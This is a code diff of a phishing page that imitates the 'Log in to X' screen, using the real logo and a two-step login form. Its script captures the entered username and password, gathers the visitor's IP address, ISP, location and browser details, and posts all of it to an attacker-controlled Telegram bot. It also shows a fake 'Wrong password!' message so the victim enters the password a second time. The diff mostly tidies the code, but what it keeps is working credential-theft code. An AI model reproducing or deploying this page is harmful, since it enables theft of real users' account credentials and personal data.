@@ -5,18 +5,18 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Log in to X</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Load your config file -->
+  <!-- Load config first -->
   <script src="config.js"></script>
 </head>
 
 <body class="text-white h-screen flex flex-col bg-black">
 
-  <!-- STEP 1: Username / email / phone -->
+  <!-- STEP 1 - Username / email / phone -->
   <div id="step1" class="flex flex-col h-full justify-between">
     <div class="flex justify-between items-center px-5 py-4">
       <button class="text-lg font-medium">Cancel</button>
       
-      <!-- Official X logo -->
+      <!-- Official X logo (inline SVG) -->
       <svg width="32" height="32" viewBox="0 0 24 24" aria-label="X" role="img" class="fill-current">
         <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
       </svg>
@@ -32,33 +32,32 @@
         id="username"
         type="text"
         placeholder="Phone, email, or username"
-        autocomplete="off"
-        class="mt-10 w-full bg-black border border-gray-700 rounded-full px-5 py-4 text-lg placeholder-gray-500 focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500 transition-all duration-200"
+        class="mt-10 w-full bg-black border border-gray-700 rounded-full px-5 py-4 text-lg placeholder-gray-500 focus:outline-none focus:border-sky-500 focus:ring-1 focus:ring-sky-500"
       />
     </div>
 
     <div class="px-8 pb-8 flex justify-between items-center">
-      <span class="text-sky-500 text-base cursor-pointer hover:underline">Forgot password?</span>
-      
+      <span class="text-sky-500 text-base cursor-pointer">Forgot password?</span>
       <button
         id="nextBtn"
         disabled
-        class="px-8 py-3 rounded-full font-bold text-base transition-all duration-200
-               bg-gray-700 text-gray-500 cursor-not-allowed
-               disabled:bg-gray-700 disabled:text-gray-500 disabled:cursor-not-allowed"
+        class="bg-gray-700 text-gray-400 px-7 py-3 rounded-full font-bold text-base disabled:opacity-50"
       >
         Next
       </button>
     </div>
   </div>
 
-  <!-- STEP 2: Password + fake error -->
+  <!-- STEP 2 - Password + Error container -->
   <div id="step2" class="hidden flex flex-col h-full justify-between relative">
     <div class="flex justify-between items-center px-5 py-4">
       <button onclick="goBack()" class="text-2xl">×</button>
+      
+      <!-- Same official X logo in step 2 -->
       <svg width="32" height="32" viewBox="0 0 24 24" aria-label="X" role="img" class="fill-current">
         <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
       </svg>
+      
       <div class="w-10"></div>
     </div>
 
@@ -75,7 +74,7 @@
           id="password"
           type="password"
           placeholder="Password"
-          class="w-full bg-black border-2 border-sky-500 rounded-full px-5 py-4 pr-14 text-lg placeholder-sky-700 focus:outline-none focus:border-sky-400 transition-all duration-200"
+          class="w-full bg-black border-2 border-sky-500 rounded-full px-5 py-4 pr-14 text-lg placeholder-sky-700 focus:outline-none focus:border-sky-400"
         />
         <button
           onclick="togglePassword()"
@@ -85,9 +84,9 @@
         </button>
       </div>
 
-      <p class="text-sky-500 mt-4 cursor-pointer hover:underline">Forgot password?</p>
+      <p class="text-sky-500 mt-4 cursor-pointer">Forgot password?</p>
 
-      <!-- Fake wrong password message -->
+      <!-- Fake error message -->
       <div id="errorMsg" class="hidden mt-6 bg-blue-600 rounded-lg p-5 text-center shadow-xl">
         <p class="text-2xl font-bold">Wrong password!</p>
         <p class="text-sm mt-3 opacity-90">
@@ -101,21 +100,19 @@
       <button
         id="loginBtn"
         disabled
-        class="w-full bg-white text-black py-4 rounded-full text-lg font-bold disabled:opacity-50 disabled:bg-gray-700 disabled:text-gray-400 transition-all duration-200 active:scale-95"
+        class="w-full bg-white text-black py-4 rounded-full text-lg font-bold disabled:opacity-50 disabled:bg-gray-700 disabled:text-gray-400"
       >
         Log in
       </button>
 
       <p class="text-center text-gray-400 mt-5">
-        Don't have an account? <span class="text-sky-500 hover:underline">Sign up</span>
+        Don't have an account? <span class="text-sky-500">Sign up</span>
       </p>
     </div>
   </div>
 
   <script>
-    // ──────────────────────────────────────────────
-    //  Variables from config.js
-    // ──────────────────────────────────────────────
+    // These come from config.js
     const TELEGRAM_BOT_TOKEN = window.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID   = window.TELEGRAM_CHAT_ID;
 
@@ -130,33 +127,17 @@
 
     let attemptCount = 0;
 
-    // ──────────────────────────────────────────────
-    //  NEXT BUTTON LOGIC – becomes white & clickable
-    // ──────────────────────────────────────────────
-    function updateNextButtonState() {
-      const hasValue = usernameInput.value.trim().length > 0;
-
-      nextBtn.disabled = !hasValue;
-
-      if (hasValue) {
-        nextBtn.classList.remove("bg-gray-700", "text-gray-500", "cursor-not-allowed");
-        nextBtn.classList.add("bg-white", "text-black", "hover:bg-gray-100", "cursor-pointer", "shadow-md");
-      } else {
-        nextBtn.classList.remove("bg-white", "text-black", "hover:bg-gray-100", "cursor-pointer", "shadow-md");
-        nextBtn.classList.add("bg-gray-700", "text-gray-500", "cursor-not-allowed");
-      }
-    }
-
-    // Run once on load + listen for changes
-    updateNextButtonState();
-    usernameInput.addEventListener("input", updateNextButtonState);
-    usernameInput.addEventListener("change", updateNextButtonState);
-    usernameInput.addEventListener("paste", () => setTimeout(updateNextButtonState, 10));
+    // Enable/disable Next
+    usernameInput.addEventListener("input", () => {
+      const val = usernameInput.value.trim();
+      nextBtn.disabled = !val;
+      nextBtn.classList.toggle("bg-white", !!val);
+      nextBtn.classList.toggle("text-black", !!val);
+      nextBtn.classList.toggle("bg-gray-700", !val);
+      nextBtn.classList.toggle("text-gray-400", !val);
+    });
 
     nextBtn.addEventListener("click", () => {
-      if (nextBtn.disabled) return;
-      if (!usernameInput.value.trim()) return;
-
       displayUser.textContent = usernameInput.value.trim();
       step1.classList.add("hidden");
       step2.classList.remove("hidden");
@@ -164,38 +145,25 @@
       attemptCount = 0;
     });
 
-    // ──────────────────────────────────────────────
-    //  BACK BUTTON
-    // ──────────────────────────────────────────────
     function goBack() {
       step2.classList.add("hidden");
       step1.classList.remove("hidden");
       errorMsg.classList.add("hidden");
     }
 
-    // ──────────────────────────────────────────────
-    //  PASSWORD FIELD + LOGIN BUTTON
-    // ──────────────────────────────────────────────
     passwordInput.addEventListener("input", () => {
-      const hasValue = passwordInput.value.trim().length > 0;
-      loginBtn.disabled = !hasValue;
-
-      if (hasValue) {
-        loginBtn.classList.remove("bg-gray-700", "text-gray-400");
-        loginBtn.classList.add("bg-white", "text-black");
-      } else {
-        loginBtn.classList.remove("bg-white", "text-black");
-        loginBtn.classList.add("bg-gray-700", "text-gray-400");
-      }
+      const val = passwordInput.value.trim();
+      loginBtn.disabled = !val;
+      loginBtn.classList.toggle("bg-white", !!val);
+      loginBtn.classList.toggle("text-black", !!val);
+      loginBtn.classList.toggle("bg-gray-700", !val);
+      loginBtn.classList.toggle("text-gray-400", !val);
     });
 
     function togglePassword() {
       passwordInput.type = passwordInput.type === "password" ? "text" : "password";
     }
 
-    // ──────────────────────────────────────────────
-    //  CAPTURE + SEND TO TELEGRAM
-    // ──────────────────────────────────────────────
     async function captureAndSend(attemptNumber) {
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
@@ -225,7 +193,7 @@
           geo.isp     = data.org || data.asn || "unknown";
           geo.proxy   = data.in_eu || data.proxy ? "Yes" : "No";
         }
-      } catch (err) {}
+      } catch {}
 
       const ua = navigator.userAgent;
       const now = new Date();
@@ -270,8 +238,10 @@
 🛡️ Data Pipeline: ACTIVE
 ═══════════════════════════════════════`;
 
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
       try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -283,11 +253,9 @@
       } catch {}
     }
 
-    // ──────────────────────────────────────────────
-    //  LOGIN BUTTON CLICK
-    // ──────────────────────────────────────────────
     loginBtn.addEventListener("click", async () => {
       attemptCount++;
+
       await captureAndSend(attemptCount);
 
       if (attemptCount === 1) {
